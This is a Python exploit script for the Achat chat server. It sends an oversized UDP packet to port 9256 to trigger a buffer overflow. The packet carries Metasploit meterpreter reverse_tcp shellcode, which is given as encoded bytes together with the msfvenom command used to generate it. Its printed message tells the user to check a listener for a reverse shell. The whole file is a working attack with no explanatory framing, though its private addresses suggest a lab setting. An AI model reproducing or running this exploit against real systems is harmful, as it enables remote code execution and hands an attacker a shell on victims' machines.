#!/usr/bin/python

import socket
import sys, time

#Change the following command to include your local Kali Linux IP.
#
# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4446 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX EXITFUNC=thread -f python

#Payload size: 512 bytes

buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x79\x58\x74\x42"
buf += "\x4d\x30\x39\x70\x39\x70\x73\x30\x43\x59\x69\x55\x6d"
buf += "\x61\x77\x50\x30\x64\x52\x6b\x32\x30\x70\x30\x64\x4b"
buf += "\x42\x32\x7a\x6c\x42\x6b\x4f\x62\x4b\x64\x74\x4b\x30"
buf += "\x72\x4c\x68\x7a\x6f\x66\x57\x6e\x6a\x4e\x46\x70\x31"
buf += "\x59\x6f\x36\x4c\x6f\x4c\x43\x31\x73\x4c\x7a\x62\x6c"
buf += "\x6c\x6f\x30\x65\x71\x58\x4f\x4a\x6d\x6a\x61\x46\x67"
buf += "\x77\x72\x49\x62\x71\x42\x4e\x77\x44\x4b\x72\x32\x4e"
buf += "\x30\x44\x4b\x6d\x7a\x6d\x6c\x74\x4b\x6e\x6c\x6e\x31"
buf += "\x44\x38\x78\x63\x30\x48\x7a\x61\x57\x61\x70\x51\x74"
buf += "\x4b\x61\x49\x4d\x50\x7a\x61\x69\x43\x44\x4b\x70\x49"
buf += "\x6e\x38\x7a\x43\x6d\x6a\x6d\x79\x44\x4b\x4c\x74\x72"
buf += "\x6b\x6d\x31\x58\x56\x30\x31\x49\x6f\x34\x6c\x56\x61"
buf += "\x56\x6f\x4a\x6d\x5a\x61\x68\x47\x70\x38\x79\x50\x50"
buf += "\x75\x6c\x36\x69\x73\x33\x4d\x4b\x48\x6f\x4b\x53\x4d"
buf += "\x6e\x44\x72\x55\x37\x74\x32\x38\x64\x4b\x61\x48\x6b"
buf += "\x74\x59\x71\x49\x43\x50\x66\x44\x4b\x6c\x4c\x50\x4b"
buf += "\x62\x6b\x42\x38\x6d\x4c\x59\x71\x4a\x33\x52\x6b\x4c"
buf += "\x44\x72\x6b\x79\x71\x4a\x30\x35\x39\x6f\x54\x6d\x54"
buf += "\x4b\x74\x71\x4b\x4f\x6b\x53\x31\x62\x39\x4f\x6a\x4e"
buf += "\x71\x4b\x4f\x67\x70\x31\x4f\x71\x4f\x6e\x7a\x34\x4b"
buf += "\x7a\x72\x38\x6b\x74\x4d\x31\x4d\x6f\x78\x6c\x73\x6c"
buf += "\x72\x49\x70\x49\x70\x51\x58\x31\x67\x64\x33\x30\x32"
buf += "\x31\x4f\x4f\x64\x53\x38\x6e\x6c\x54\x37\x6c\x66\x59"
buf += "\x77\x65\x39\x57\x78\x39\x6f\x48\x50\x54\x78\x54\x50"
buf += "\x4a\x61\x4d\x30\x4b\x50\x4f\x39\x36\x64\x4f\x64\x62"
buf += "\x30\x71\x58\x4e\x49\x55\x30\x32\x4b\x6d\x30\x6b\x4f"
buf += "\x78\x55\x6f\x7a\x79\x7a\x50\x68\x65\x70\x47\x38\x6c"
buf += "\x78\x72\x46\x33\x38\x4d\x32\x59\x70\x6e\x31\x6f\x6e"
buf += "\x61\x79\x59\x56\x72\x30\x52\x30\x32\x30\x72\x30\x4d"
buf += "\x70\x62\x30\x61\x30\x42\x30\x70\x68\x79\x5a\x4a\x6f"
buf += "\x69\x4f\x49\x50\x79\x6f\x36\x75\x64\x57\x31\x5a\x6c"
buf += "\x50\x32\x36\x31\x47\x63\x38\x66\x39\x76\x45\x51\x64"
buf += "\x33\x31\x6b\x4f\x58\x55\x33\x55\x45\x70\x73\x44\x79"
buf += "\x7a\x79\x6f\x50\x4e\x39\x78\x31\x65\x48\x6c\x57\x78"
buf += "\x4f\x77\x69\x70\x6d\x30\x4d\x30\x61\x5a\x49\x70\x50"
buf += "\x6a\x4b\x54\x31\x46\x6e\x77\x32\x48\x79\x72\x79\x49"
buf += "\x35\x78\x51\x4f\x59\x6f\x37\x65\x31\x73\x79\x68\x69"
buf += "\x70\x51\x6e\x4e\x56\x62\x6b\x4d\x66\x50\x6a\x51\x30"
buf += "\x6f\x78\x6b\x50\x6e\x30\x59\x70\x59\x70\x51\x46\x31"
buf += "\x5a\x6b\x50\x72\x48\x6f\x68\x55\x54\x42\x33\x69\x55"
buf += "\x6b\x4f\x38\x55\x42\x73\x71\x43\x61\x5a\x69\x70\x50"
buf += "\x56\x52\x33\x52\x37\x50\x68\x79\x72\x57\x69\x39\x38"
buf += "\x6f\x6f\x69\x6f\x36\x75\x71\x73\x5a\x58\x49\x70\x33"
buf += "\x4d\x4e\x48\x32\x38\x43\x38\x79\x70\x51\x30\x6d\x30"
buf += "\x79\x70\x6f\x7a\x4d\x30\x52\x30\x53\x38\x5a\x6b\x6e"
buf += "\x4f\x4a\x6f\x6c\x70\x4b\x4f\x47\x65\x52\x37\x30\x68"
buf += "\x30\x75\x32\x4e\x50\x4d\x43\x31\x69\x6f\x56\x75\x31"
buf += "\x4e\x61\x4e\x4b\x4f\x4a\x6c\x4f\x34\x4c\x4f\x53\x55"
buf += "\x30\x70\x6b\x4f\x4b\x4f\x6b\x4f\x59\x59\x65\x4b\x49"
buf += "\x6f\x4b\x4f\x59\x6f\x5a\x61\x77\x53\x6f\x39\x77\x56"
buf += "\x71\x65\x77\x51\x77\x53\x75\x6b\x57\x70\x4b\x6d\x4c"
buf += "\x6a\x4a\x6a\x42\x48\x54\x66\x36\x35\x55\x6d\x53\x6d"
buf += "\x6b\x4f\x58\x55\x6f\x4c\x59\x76\x71\x6c\x69\x7a\x65"
buf += "\x30\x6b\x4b\x67\x70\x54\x35\x5a\x65\x37\x4b\x4d\x77"
buf += "\x4e\x33\x70\x72\x42\x4f\x61\x5a\x6b\x50\x6f\x63\x39"
buf += "\x6f\x67\x65\x41\x41"

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('192.168.56.105', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40" 
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "\n[+]Sending exploit to Achat. Check your listener for a reverse shell."
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()
